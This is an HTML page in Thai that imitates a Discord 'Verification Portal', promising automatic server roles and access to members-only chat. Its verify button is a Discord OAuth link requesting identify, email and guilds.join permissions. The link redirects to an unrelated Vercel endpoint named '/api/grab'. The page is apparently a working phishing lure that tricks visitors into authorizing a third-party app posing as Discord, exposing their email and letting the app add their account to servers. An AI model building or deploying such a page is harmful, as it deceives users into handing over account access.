<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Verification Portal</title>
    <style>
        :root { --blurple: #5865f2; --bg: #313338; --card: #2b2d31; --text: #f2f3f5; }
        body { background-color: var(--bg); color: var(--text); font-family: 'gg sans', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { background-color: var(--card); width: 420px; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .discord-logo { width: 100px; height: 100px; margin-bottom: 25px; animation: float 3s ease-in-out infinite; filter: drop-shadow(0 0 15px var(--blurple)); }
        @keyframes float { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-15px) rotate(5deg); } }
        h1 { font-size: 26px; font-weight: 800; margin-bottom: 10px; }
        p { color: #b9bbbe; font-size: 15px; line-height: 22px; margin-bottom: 35px; }
        .btn-verify { background-color: var(--blurple); color: white; text-decoration: none; padding: 14px 0; border-radius: 5px; display: block; font-weight: 700; font-size: 18px; transition: 0.25s; width: 100%; border: none; cursor: pointer; }
        .btn-verify:hover { background-color: #4752c4; transform: scale(1.02); }
        .footer { margin-top: 25px; font-size: 11px; color: #72767d; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://assets-global.website-files.com/6257adef93867e3ef29194a1/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="discord-logo">
        <h1>ยืนยันยศของคุณ</h1>
        <p>เชื่อมต่อบัญชีของคุณเพื่อรับยศอัตโนมัติภายในเซิร์ฟเวอร์ และเข้าถึงห้องแชทพิเศษสำหรับสมาชิกเท่านั้น</p>
        
        <a href="https://discord.com/api/oauth2/authorize?client_id=1483393398131134646&redirect_uri=https://index-html-five.vercel.app/api/grab&response_type=code&scope=identify%20email%20guilds.join" class="btn-verify">ยืนยันตัวตนทันที</a>
        
        <div class="footer">Secure Verification System © 2026</div>
    </div>
</body>
</html>
